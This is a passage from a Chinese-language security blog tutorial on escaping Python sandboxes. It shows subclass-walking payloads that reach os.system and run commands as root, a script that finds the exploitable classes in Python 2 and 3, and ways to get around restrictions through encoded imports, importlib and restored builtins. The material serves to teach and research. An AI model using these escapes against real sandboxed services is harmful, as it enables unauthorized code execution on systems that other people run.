class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">48</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">49</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">50</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">51</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">52</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">53</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">54</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">55</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">56</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">57</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">58</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">59</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">60</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">61</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">62</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">63</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">64</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">65</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">66</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">67</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">68</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">69</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">70</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">71</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">72</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">73</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">74</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">75</span>, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">76</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">77</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;)</span><br><span class="line">(<span class="number">78</span>, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">root</span><br></pre></td></tr></table></figure><p>我们直接看下python2中的逻辑</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/lib/python2.7/warnings.py</span><br></pre></td></tr></table></figure><p>可以看到导入了3个包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> types</span><br></pre></td></tr></table></figure><p>然后再接着看</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/lib/python2.7/linecache.py</span><br></pre></td></tr></table></figure><p>可以看到导入了2个包</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><p>那么久可以构成了这个代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;linecache&#x27;</span>].os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="特殊函数查找"><a href="#特殊函数查找" class="headerlink" title="特殊函数查找"></a>特殊函数查找</h4><p>首先去Python的GitHub主页，找到所有的模块列表：</p><ul><li>Python2.7：<a href="https://github.com/python/cpython/tree/2.7/Lib">https://github.com/python/cpython/tree/2.7/Lib</a></li><li>Python3.8：<a href="https://github.com/python/cpython/tree/3.8/Lib">https://github.com/python/cpython/tree/3.8/Lib</a></li></ul><p>通过脚本进行筛选，执行方式看代码注释</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2022-09-22 13:30:58</span></span><br><span class="line"><span class="comment"># @Author  : ascotbe (ascotbe@gmail.org)</span></span><br><span class="line"><span class="comment"># @Link    : https://www.ascotbe.com/</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_name</span>(<span class="params">url</span>):</span><br><span class="line">    file_name=[]</span><br><span class="line">    file_name_txt=<span class="string">&quot;&quot;</span></span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a.json():</span><br><span class="line">        file_name.append(i[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        file_name_txt+=i[<span class="string">&#x27;name&#x27;</span>]+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&quot;python.txt&quot;</span>,<span class="string">&quot;w&quot;</span>).write(file_name_txt)</span><br><span class="line">    <span class="keyword">with</span> codecs.<span class="built_in">open</span>(<span class="string">&#x27;python.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        modules = f.readlines()</span><br><span class="line">    modules = [m.strip().replace(<span class="string">&#x27;.py&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> m <span class="keyword">in</span> modules]</span><br><span class="line">    target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>]</span><br><span class="line">    target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>]</span><br><span class="line">    all_targets = target_modules + target_functions</span><br><span class="line">    results = defaultdict(<span class="built_in">list</span>)</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> modules:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            module = <span class="built_in">__import__</span>(m)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;ERROR:&#x27;</span>, m)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> t <span class="keyword">in</span> module.__dict__:</span><br><span class="line">                results[m.encode()].append(t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;可利用模块数量为:&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(results)))</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> results.items():</span><br><span class="line">        <span class="built_in">print</span>(k, v)</span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">python2</span>(<span class="params">results</span>):</span><br><span class="line">    find_modules=results</span><br><span class="line">    target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">    target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    all_targets = <span class="built_in">list</span>(<span class="built_in">set</span>(find_modules.keys() + target_modules + target_functions))</span><br><span class="line">    all_modules = <span class="built_in">list</span>(<span class="built_in">set</span>(find_modules.keys() + target_modules))</span><br><span class="line">    subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">    sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------1-----------&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(sub_name):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f == s:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">                <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                    target = find_modules[f]</span><br><span class="line">                    sub_dict = subclasses[i].__dict__</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                        <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                            <span class="built_in">print</span>(i, f, target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------2-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.func_globals</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, sub, m, find_modules.get(m))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------3-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.func_globals.values()</span><br><span class="line">            <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(more):</span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                                <span class="built_in">print</span>(i, j, sub, f)</span><br><span class="line">                            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                                target = find_modules.get(f)</span><br><span class="line">                                sub_dict = v[f].__dict__</span><br><span class="line">                                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                        <span class="built_in">print</span>(i, j, sub, f, target)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------4-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)</span></span><br><span class="line">    <span class="comment"># &lt;class &#x27;warnings.catch_warnings&#x27;&gt;类很特殊，在内部定义了_module=sys.modules[&#x27;warnings&#x27;]，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub()._module.__builtins__</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">python3</span>(<span class="params">results</span>):</span><br><span class="line">    find_modules=results</span><br><span class="line">    target_modules = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">    target_functions = [<span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    all_targets = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules + target_functions))</span><br><span class="line">    all_modules = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">list</span>(find_modules.keys()) + target_modules))</span><br><span class="line">    subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">    sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line">    <span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40](&#x27;./test.py&#x27;).read()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------1-----------&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(sub_name):</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f == s:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">                <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                    target = find_modules[f]</span><br><span class="line">                    sub_dict = subclasses[i].__dict__</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                        <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                            <span class="built_in">print</span>(i, f, target)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------2-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;sys&#x27;].version</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.__globals__</span><br><span class="line">            <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, sub, m, find_modules.get(m))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------3-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 执行命令，此处如果使用原作者给的第三种利用代码在python3中会报错，python3中对于dict.values不再返回列表，而是返回view，不可索引的对象。</span></span><br><span class="line">    <span class="comment"># 先要进入().__class__.__bases__[0].__subclasses__()[103].__init__.__globals__中找到__builtins__模块，然后执行后面的代码</span></span><br><span class="line">    <span class="comment"># ().__class__.__bases__[0].__subclasses__()[103].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub.__init__.__globals__.values()</span><br><span class="line">            <span class="keyword">for</span> j, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(more):</span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                                <span class="built_in">print</span>(i, j, sub, f)</span><br><span class="line">                            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                                target = find_modules.get(f)</span><br><span class="line">                                sub_dict = v[f].__dict__</span><br><span class="line">                                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                        <span class="built_in">print</span>(i, j, sub, f, target)</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;----------4-----------&#x27;</span>)</span><br><span class="line">    <span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__[&#x27;__import__&#x27;](&quot;os&quot;).system(&quot;ls&quot;)</span></span><br><span class="line">    <span class="keyword">for</span> i, sub <span class="keyword">in</span> <span class="built_in">enumerate</span>(subclasses):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            more = sub()._module.__builtins__</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                    <span class="built_in">print</span>(i, f)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    version= <span class="built_in">str</span>(sys.version_info.major)+<span class="string">&quot;.&quot;</span>+<span class="built_in">str</span>(sys.version_info.minor)</span><br><span class="line">    url=<span class="string">&quot;https://api.github.com/repos/python/cpython/contents/Lib?ref=&quot;</span>+version</span><br><span class="line">    results = get_file_name(url)</span><br><span class="line">    <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span>:</span><br><span class="line">        python2(results)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        python3(results)</span><br></pre></td></tr></table></figure><h3 id="绕过限制"><a href="#绕过限制" class="headerlink" title="绕过限制"></a>绕过限制</h3><h4 id="使用编码进行导入"><a href="#使用编码进行导入" class="headerlink" title="使用编码进行导入"></a>使用编码进行导入</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">test = <span class="built_in">__import__</span>(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> test.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">test = <span class="built_in">__import__</span>(<span class="built_in">__import__</span>(<span class="string">&quot;codecs&quot;</span>).decode(<span class="string">&#x27;bf&#x27;</span>,<span class="string">&#x27;rot_13&#x27;</span>))  <span class="comment"># python3没有commands模块</span></span><br><span class="line"><span class="built_in">print</span>(test.system(<span class="string">&#x27;ifconfig&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="使用importlib库"><a href="#使用importlib库" class="headerlink" title="使用importlib库"></a>使用<strong>importlib</strong>库</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">test = importlib.import_module(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> test.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">test = importlib.import_module(importlib.import_module(<span class="string">&quot;codecs&quot;</span>).decode(<span class="string">&#x27;bf&#x27;</span>,<span class="string">&#x27;rot_13&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(test.system(<span class="string">&#x27;ifconfig&#x27;</span>))</span><br></pre></td></tr></table></figure><h4 id="内置函数被删除"><a href="#内置函数被删除" class="headerlink" title="内置函数被删除"></a>内置函数被删除</h4><p>在python中不用引入直接使用的内置函数称为<strong>builtin</strong>函数</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure><div class="note success modern"><p>在python3.x 版本中<code>__builtin__</code>变成了<code>builtins</code></p><p><code>__builtin__</code>和<code>builtins</code>在都需要import才可以用，但是<code>__builtins__</code>是内置的直接可以用</p></div><p>用<code>__builtin__</code>来举例子，因此<code>open()</code>、<code>int()</code>、<code>chr()</code>这些函数，就相当于</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtin__.<span class="built_in">open</span>()</span><br><span class="line">__builtin__.<span class="built_in">int</span>()</span><br><span class="line">__builtin__.<span class="built_in">chr</span>()</span><br></pre></td></tr></table></figure><p>如果我们把这些函数从<code>__builtin__</code>中删除，那么就不能够再直接使用了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─<span class="comment"># python2</span></span><br><span class="line">Python <span class="number">2.7</span><span class="number">.18</span> (default, Jan <span class="number">27</span> <span class="number">2022</span>, 02:05:<span class="number">20</span>) </span><br><span class="line">[GCC <span class="number">11.2</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__.<span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtin__.<span class="built_in">chr</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;chr&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__.<span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">AttributeError: <span class="string">&#x27;module&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;chr&#x27;</span></span><br></pre></td></tr></table></figure><p>众所周知<code>eval</code>、<code>exec</code>、<code>execfile</code>也是在<code>__builtin__</code>中的，所以删除就不能用了，但是我们可以使用重加载函数<code>reload()</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtin__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">123</span>)</span><br><span class="line"><span class="string">&#x27;&#123;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>reload</code>也是<code>__builtin__</code>下面的函数，如果直接把它干掉，就没办法重新引入了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">del</span> __builtin__.reload</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>reload(__builtin__)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;reload&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><p>直接使用<strong>imp</strong>模块，这样我们就重新得到完整的<code>__builtin__</code>模块了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> imp</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>imp.reload(__builtin__)</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><h4 id="部分模块被限制"><a href="#部分模块被限制" class="headerlink" 